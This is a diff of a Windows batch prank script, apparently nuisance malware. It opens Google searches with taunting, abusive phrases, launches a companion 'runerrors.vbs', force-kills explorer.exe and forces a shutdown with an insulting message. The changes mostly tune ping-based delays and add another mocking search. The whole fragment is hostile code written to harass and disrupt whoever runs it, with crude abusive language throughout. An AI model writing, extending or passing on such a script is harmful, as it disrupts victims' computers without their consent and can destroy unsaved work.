@@ -55,15 +55,17 @@ ping localhost -n 10 >NUL
 
 start https://www.google.com/search?q=Are+my+mousebuttons+swapped?+~yes
 
-ping localhost -n 4
+ping localhost -n 12 >NUL
+
+start https://www.google.com/search?q=Best,+dankest+Memes+ever
+
+ping localhost -n 8 >NUL
 
 start https://www.google.com/search?q=GET+DESTROYED+BITCH!+HAHAHA
 
 start runerrors.vbs
 
-start explorer.exe
-
-ping localhost -n 2 >NUL
+ping localhost -n 10 >NUL
 start notepad.exe
 
 cd "%userprofile%/Desktop"
@@ -141,6 +143,6 @@ ping localhost -n 4 >NUL
 taskkill /F /IM explorer.exe
 
 
-shutdown -s -t 4 -c "Bye Bye Bitch! HAHAHAAHAHAH"
+shutdown -s -t 6 -c "Bye Bye Bitch! HAHAHAAHAHAH"
 
 
